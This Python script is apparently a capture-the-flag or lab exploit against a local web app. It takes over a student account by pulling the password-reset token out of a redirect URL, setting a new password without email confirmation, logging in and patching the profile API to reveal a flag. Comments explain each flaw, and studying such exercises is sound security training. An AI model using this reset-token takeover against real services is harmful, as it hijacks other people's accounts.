#FLAG in pocketbase recovery code for students
#research some more about this

from urllib.parse import urlparse, parse_qs
import sys
import requests

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

#login and get session cookie
print(f"{CYAN}--- requesting a password reset for benjamin@student.42.tech ---{RESET}")
email = "benjamin@student.42.tech"
auth = requests.post(
    "http://localhost:4942/reset-password/request",
    data={"email": email},
    allow_redirects=False
)
location = auth.headers.get("location")
print("status:", auth.status_code)
print(f"{CYAN}--- upon sending this off, the URL changes to ---{RESET}")

print(location if location else "no location header")

print(f"{CYAN}--- which is just the email + the md5 token behind it (bad) ---{RESET}")
params = parse_qs(urlparse(location).query)
token = params["token"][0]
print("token:", token)
 
response = requests.get(
        "http://localhost:4942" + location
    )
print("__________")
print(f"{CYAN}--- furthermore, the very next redirect is the site asking us what to set the new password to, without waiting for a confirmation from the actual email (bad) ---{RESET}")
print("response text of resetting benjamins password:\n")
print("__________")

keyword = "Enter your new password"
index = response.text.find(keyword)

# Check if found to avoid slicing from -1
if index != -1:
	result = response.text[index:]
	lines = result.splitlines()[:13]
	print("\n".join(lines))
else:
    print("")


print(f"{CYAN}--- this shows us the url to target for the post request to send off a new password ---{RESET}")


new_password = input("enter your new password here(must be 5 characters): ")
newpass = requests.post(
    "http://localhost:4942/reset-password/confirm",
    data={"email": email, "token": token, "new_password": new_password},
    allow_redirects=False
)


print("status:", newpass.status_code)
print("location:", newpass.headers.get("location"))
print(newpass.text[:200])

print(f"{CYAN}--- now that we changed the password, all thats left is to login ---{RESET}")

auth = requests.post(
    "http://localhost:4942/login",
    data={"identity": email, "password": new_password},
    allow_redirects=False
)
 
cookies = auth.cookies
if not cookies.get("session"):
    print("Login failed - no session cookie received")
    print("Status:", auth.status_code)
    print(auth.text[:200])
    sys.exit(1)
 
print("Logged in successfully with " + email + " and " + new_password)


print(f"{CYAN}--- now for some reason, the actual flag for this vulnerability isn't that obvious to find, i found it in the backend(which we'll get into later), as well as in the api patch profile ---{RESET}")


response = requests.patch(
        "http://localhost:4942/api/profile",
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
		json={"role": "student"},
        allow_redirects=False
    )
print("__________")
print("response text of patch profile:\n")
print(response.text)
print(response.status_code)
print("__________")